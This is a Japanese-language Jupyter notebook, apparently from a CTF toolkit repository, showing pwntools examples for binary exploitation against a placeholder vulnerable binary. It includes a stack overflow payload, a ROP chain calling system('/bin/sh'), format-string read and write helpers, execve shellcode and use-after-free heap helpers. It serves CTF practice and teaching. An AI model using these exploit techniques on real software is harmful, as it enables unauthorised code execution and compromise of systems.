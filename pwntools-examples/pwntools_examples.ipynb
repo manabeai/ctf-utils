{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Pwntools 使用例集\n",
    "\n",
    "このノートブックでは、CTFでよく使用されるpwntoolsの実用的な使用例をまとめています。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1. 基本的な接続とI/O操作"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# ローカルプロセスへの接続\n",
    "p = process('./vulnerable_binary')\n",
    "\n",
    "# リモートサーバーへの接続\n",
    "# r = remote('ctf.example.com', 1337)\n",
    "\n",
    "# データの送信\n",
    "p.sendline(b'Hello, World!')\n",
    "\n",
    "# データの受信\n",
    "response = p.recvline()\n",
    "print(response)\n",
    "\n",
    "# 特定の文字列まで受信\n",
    "p.recvuntil(b'Enter your name: ')\n",
    "p.sendline(b'CTF Player')\n",
    "\n",
    "# インタラクティブモード\n",
    "# p.interactive()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2. パッキングとアンパッキング"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# 32ビットと64ビットのパッキング\n",
    "addr_32 = p32(0x08048000)  # 32ビットアドレス\n",
    "addr_64 = p64(0x0000555555554000)  # 64ビットアドレス\n",
    "\n",
    "print(f\"32-bit packed: {addr_32.hex()}\")\n",
    "print(f\"64-bit packed: {addr_64.hex()}\")\n",
    "\n",
    "# アンパッキング\n",
    "unpacked_32 = u32(addr_32)\n",
    "unpacked_64 = u64(addr_64)\n",
    "\n",
    "print(f\"32-bit unpacked: 0x{unpacked_32:08x}\")\n",
    "print(f\"64-bit unpacked: 0x{unpacked_64:016x}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3. バッファオーバーフロー攻撃の例"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# ELFファイルの解析\n",
    "elf = ELF('./vulnerable_binary')\n",
    "\n",
    "# 関数のアドレスを取得\n",
    "main_addr = elf.symbols['main']\n",
    "system_addr = elf.plt['system']\n",
    "got_puts = elf.got['puts']\n",
    "\n",
    "print(f\"main address: 0x{main_addr:x}\")\n",
    "print(f\"system PLT: 0x{system_addr:x}\")\n",
    "print(f\"puts GOT: 0x{got_puts:x}\")\n",
    "\n",
    "# ペイロードの作成\n",
    "padding = b'A' * 64  # バッファサイズ\n",
    "rbp = b'B' * 8       # 保存されたRBP\n",
    "ret_addr = p64(0x401234)  # リターンアドレス\n",
    "\n",
    "payload = padding + rbp + ret_addr\n",
    "\n",
    "# プロセスに送信\n",
    "# p = process('./vulnerable_binary')\n",
    "# p.sendline(payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 4. ROP (Return Oriented Programming)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# ROPガジェットの検索\n",
    "elf = ELF('./vulnerable_binary')\n",
    "rop = ROP(elf)\n",
    "\n",
    "# pop rdi; ret ガジェットの検索\n",
    "pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n",
    "print(f\"pop rdi; ret gadget: 0x{pop_rdi:x}\")\n",
    "\n",
    "# ROPチェーンの構築\n",
    "rop_chain = flat([\n",
    "    pop_rdi,\n",
    "    next(elf.search(b'/bin/sh\\x00')),  # /bin/shの文字列アドレス\n",
    "    elf.symbols['system']\n",
    "])\n",
    "\n",
    "# 完全なペイロード\n",
    "payload = b'A' * 64 + b'B' * 8 + rop_chain"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 5. フォーマット文字列攻撃"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# フォーマット文字列でのメモリリーク\n",
    "def leak_memory(offset):\n",
    "    payload = f'%{offset}$p'.encode()\n",
    "    p.sendline(payload)\n",
    "    leak = p.recvline()\n",
    "    return int(leak.decode().strip(), 16)\n",
    "\n",
    "# 任意のアドレスへの書き込み\n",
    "def write_memory(addr, value):\n",
    "    # fmtstr_payload を使用\n",
    "    payload = fmtstr_payload(6, {addr: value})\n",
    "    return payload\n",
    "\n",
    "# 使用例\n",
    "# target_addr = 0x601020  # GOTエントリなど\n",
    "# shell_addr = 0x400700   # system関数のアドレスなど\n",
    "# payload = write_memory(target_addr, shell_addr)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 6. シェルコード実行"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# アーキテクチャの設定\n",
    "context.arch = 'amd64'\n",
    "context.os = 'linux'\n",
    "\n",
    "# シェルコードの生成\n",
    "shellcode = asm(shellcraft.sh())\n",
    "print(f\"Shellcode length: {len(shellcode)} bytes\")\n",
    "print(f\"Shellcode: {shellcode.hex()}\")\n",
    "\n",
    "# カスタムシェルコード\n",
    "custom_shellcode = asm(\"\"\"\n",
    "    xor rax, rax\n",
    "    push rax\n",
    "    mov rbx, 0x68732f2f6e69622f\n",
    "    push rbx\n",
    "    mov rdi, rsp\n",
    "    push rax\n",
    "    push rdi\n",
    "    mov rsi, rsp\n",
    "    xor rdx, rdx\n",
    "    mov al, 0x3b\n",
    "    syscall\n",
    "\"\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 7. ヒープエクスプロイト基礎"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# ヒープ関連の基本操作\n",
    "def malloc(size, data):\n",
    "    p.sendline(b'1')  # malloc option\n",
    "    p.sendline(str(size).encode())\n",
    "    p.sendline(data)\n",
    "\n",
    "def free(index):\n",
    "    p.sendline(b'2')  # free option\n",
    "    p.sendline(str(index).encode())\n",
    "\n",
    "def show(index):\n",
    "    p.sendline(b'3')  # show option\n",
    "    p.sendline(str(index).encode())\n",
    "    return p.recvline()\n",
    "\n",
    "# Use After Free の例\n",
    "# malloc(0x20, b'A' * 0x20)\n",
    "# malloc(0x20, b'B' * 0x20)\n",
    "# free(0)\n",
    "# free(1)\n",
    "# malloc(0x20, p64(target_addr))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 8. デバッグとGDB連携"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# GDBでデバッグ\n",
    "context.terminal = ['tmux', 'splitw', '-h']\n",
    "\n",
    "# デバッグ付きでプロセスを起動\n",
    "p = process('./vulnerable_binary')\n",
    "gdb.attach(p, '''\n",
    "    break *main+42\n",
    "    continue\n",
    "''')\n",
    "\n",
    "# ブレークポイントで停止するまで待機\n",
    "pause()\n",
    "\n",
    "# ペイロードを送信\n",
    "# p.sendline(payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 9. 暗号関連ユーティリティ"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# XOR操作\n",
    "data = b'Hello, World!'\n",
    "key = b'KEY'\n",
    "encrypted = xor(data, key)\n",
    "print(f\"Encrypted: {encrypted.hex()}\")\n",
    "print(f\"Decrypted: {xor(encrypted, key)}\")\n",
    "\n",
    "# Base64エンコード/デコード\n",
    "encoded = b64e(b'CTF{flag_here}')\n",
    "print(f\"Base64: {encoded}\")\n",
    "decoded = b64d(encoded)\n",
    "print(f\"Decoded: {decoded}\")\n",
    "\n",
    "# MD5ハッシュ\n",
    "hash_value = md5sumhex(b'password')\n",
    "print(f\"MD5: {hash_value}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 10. 便利なユーティリティ"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# cyclic pattern生成（オフセット計算用）\n",
    "pattern = cyclic(100)\n",
    "print(f\"Cyclic pattern: {pattern[:50]}...\")\n",
    "\n",
    "# オフセットの検索\n",
    "# クラッシュ時のEIPの値が 0x61616173 だった場合\n",
    "offset = cyclic_find(0x61616173)\n",
    "print(f\"Offset: {offset}\")\n",
    "\n",
    "# ファイル操作\n",
    "write('exploit.py', '''\n",
    "#!/usr/bin/env python3\n",
    "from pwn import *\n",
    "\n",
    "p = process('./vulnerable')\n",
    "# exploit code here\n",
    "p.interactive()\n",
    "''')\n",
    "\n",
    "# プログレスバー\n",
    "with log.progress('Bruteforcing') as prog:\n",
    "    for i in range(100):\n",
    "        prog.status(f'{i}/100')\n",
    "        # ブルートフォース処理\n",
    "        sleep(0.01)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}